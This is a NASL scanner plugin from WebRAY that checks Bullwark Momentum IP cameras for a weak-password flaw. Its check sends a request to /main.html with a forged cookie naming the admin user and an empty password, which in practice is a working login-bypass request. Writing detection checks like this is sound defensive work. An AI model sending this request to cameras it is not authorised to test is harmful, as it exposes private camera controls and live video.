############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799142);
 name = "Bullwark Momentum series IP Camera - weak password vulnerability";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family(english:"Camera");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"risk_factor", value:"High");
 script_set_attribute(attribute:"description", value:"Turkey Bullwark Momentum series IP camera has a weak password vulnerability. It can log in to the background directly to view sensitive information such as camera status, content, and even live video content.");
 script_set_attribute(attribute:"solution", value:"Control permissions, change passwords, preferably including upper and lower case letters, numbers and special characters.");
 script_end_attributes();
 script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


function check_vuln(port){
	if ( !get_port_state(port) ) exit(0);
	url = string("/main.html");
	req = http_send_recv3(method: "GET", port: port, item: url, add_headers: make_array("Cookie", "lang=en; channelCount=8; clientPort=80; remoteClientPort=60001; sensorCount=4; modelName=BLW-2008E-AHD; sync_time=1; pwd=; rememberme=false; usr=admin" ));
	if( req[2] == NULL) exit(0);
	con = url + req[1] + req[2];
	if( "200 ">< req[0] && "SPEED" >< req[2] && "ZOOM" >< req[2] ){
	  	if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
    }
}

function check_vuln_ssl(port){
	if ( !get_port_state(port) ) exit(0);
	url = string("/main.html");
	res = http_send_recv3(method: "GET", port: port, item: url, add_headers: make_array("Cookie", "lang=en; channelCount=8; clientPort=80; remoteClientPort=60001; sensorCount=4; modelName=BLW-2008E-AHD; sync_time=1; pwd=; rememberme=false; usr=admin" ));
	req = http_last_sent_request();
    ssl_req = https_req_get(port:port , request:req);
	if( ssl_req == NULL) exit(0);
	con = req + ssl_req;
	if( "200 "><ssl_req && "SPEED"><ssl_req && "ZOOM"><ssl_req ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}